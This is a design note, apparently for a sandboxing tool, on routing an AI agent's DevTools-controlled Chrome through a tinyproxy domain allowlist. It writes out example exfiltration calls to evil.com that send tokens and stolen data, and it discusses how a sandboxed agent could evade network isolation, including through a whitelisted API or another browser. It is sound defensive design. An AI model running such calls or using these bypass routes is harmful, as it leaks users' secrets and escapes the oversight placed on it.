# Chrome Network Filtering via Proxy

Status: **Pre-plan / Research**

## Problem

Chrome DevTools MCP gives the sandboxed agent a browser with **unrestricted internet access**. Chrome runs as the admin user — no pf rules apply. The agent can exfiltrate data via:

```
navigate_page → https://evil.com/?token=...
evaluate_script → fetch('https://evil.com', {body: stolen_data})
```

This bypasses all network isolation (pf, Docker iptables). The agent has a direct, unfiltered channel to any host on the internet through the browser.

## Solution: Filtering Proxy

Launch agent Chrome behind a tinyproxy instance that enforces the same domain whitelist as `config.toml`.

```
Agent → Chrome MCP → Chrome --proxy-server=localhost:8888
                          ↓
                     tinyproxy (localhost:8888)
                     FilterDefaultDeny Yes
                     Filter: ^api\.anthropic\.com$
                             ^registry\.npmjs\.org$
                          ↓
                     only whitelisted domains reach internet
```

### Components

| Component | Role |
|---|---|
| Chrome `--proxy-server=localhost:8888` | Forces ALL Chrome traffic through proxy |
| tinyproxy `FilterDefaultDeny Yes` | Blocks everything not in allowlist |
| tinyproxy filter file | Same hosts from `config.toml` per user |
| `ConnectPort 443` | Only HTTPS tunneling allowed |

### Why tinyproxy

- 2 MB memory footprint (POSIX, runs on macOS)
- Domain-level filtering via regex (no IP resolution needed, no CDN leakage)
- `FilterDefaultDeny` mode — default deny, explicit allow per domain
- `ConnectPort 443` — restricts CONNECT method to HTTPS only
- Install: `brew install tinyproxy`

### Comparison with alternatives

| | tinyproxy | squid | mitmproxy |
|---|---|---|---|
| Memory | 2 MB | 50+ MB | 100+ MB |
| Config | Simple text | Complex | Python scripts |
| HTTPS filtering | Domain-level (CONNECT) | Domain or full MITM | Full MITM |
| Install | `brew install tinyproxy` | `brew install squid` | `pip install mitmproxy` |
| Fit | Best for allowlisting | Overkill | Wrong tool |

## Implementation

### CLI

```bash
iso chrome                     # unrestricted (development mode)
iso chrome --filtered          # behind tinyproxy (sandboxed mode)
iso chrome --filtered --user acm   # use acm's host whitelist
```

### tinyproxy config (generated per-user)

```
User nobody
Group nogroup
Port 8888
Listen 127.0.0.1
MaxClients 10

FilterDefaultDeny Yes
Filter "/var/run/isolator-chrome/acm.filter"
FilterURLs Off
FilterExtended On

ConnectPort 443
```

### Filter file (from config.toml)

```
^api\.anthropic\.com$
^sentry\.io$
^registry\.npmjs\.org$
^pypi\.org$
^files\.pythonhosted\.org$
```

Generated from `[users.acm].hosts` + `[global].hosts`, same as `iso pf`.

### Chrome launch

```bash
/Applications/Google Chrome.app/Contents/MacOS/Google Chrome \
  --user-data-dir=/tmp/chrome-agent \
  --remote-debugging-port=9222 \
  --no-first-run \
  --proxy-server=http://127.0.0.1:8888 \
  --proxy-bypass-list="<-loopback>"
```

The `--proxy-bypass-list="<-loopback>"` allows localhost connections (needed for DevTools CDP on port 9222) while proxying everything else.

### Lifecycle

1. `iso chrome --filtered` starts tinyproxy, then Chrome
2. `iso chrome --stop` stops both
3. If tinyproxy dies, Chrome can't reach any external host (fail-safe)
4. PID files in `/var/run/isolator-chrome/`

## Security analysis

### What's blocked

- `navigate_page` to non-whitelisted domain → tinyproxy returns 403
- `evaluate_script` doing `fetch()` → same, proxy blocks
- `new_page` with arbitrary URL → blocked
- WebSocket to external host → blocked (tinyproxy doesn't relay non-CONNECT)

### What still works

- Navigation to whitelisted domains (agent needs these for testing)
- `localhost` connections (DevTools, MCP servers)
- Chrome DevTools tools: screenshot, inspect, click, fill (local operations)
- `docker pull` (daemon operation, not through Chrome)

### Limitations

- tinyproxy sees domain names but not URL paths — can't filter by endpoint
- HTTPS content is encrypted (CONNECT tunnel) — proxy only sees the domain
- Agent can fetch data FROM whitelisted domains (e.g., read public APIs) but can't POST to attacker-controlled endpoints unless they're whitelisted
- If `api.anthropic.com` is whitelisted, agent could theoretically use Claude API to exfiltrate via conversation — but the token is in the agent's keychain, and this would be visible in Claude's usage logs

### Why `--proxy-server` can't be bypassed

Chrome's `--proxy-server` flag:
- Cannot be overridden by JavaScript
- Cannot be changed by extensions (we don't install any in agent Chrome)
- Cannot be changed via `chrome://settings` (no UI in headless-ish mode)
- Is enforced at the network stack level

The only bypass: launch a different browser. But the sandboxed user can't install software (no admin access), and our CLAUDE.md tells the agent never to launch browsers.

## Dependencies

- `brew install tinyproxy` (only dependency)
- No Python packages needed

## Open questions

1. Should `--filtered` be the default for `iso chrome`? Probably yes — unrestricted should be opt-in.
2. Per-user or per-session? Per-user is simpler (one proxy config per sandbox user). Per-session would allow different users to use Chrome simultaneously with different whitelists — but we only have one Chrome instance.
3. What about `hosts = ["*"]` (unrestricted users)? Skip the proxy for them, or still proxy with FilterDefaultDeny=No?
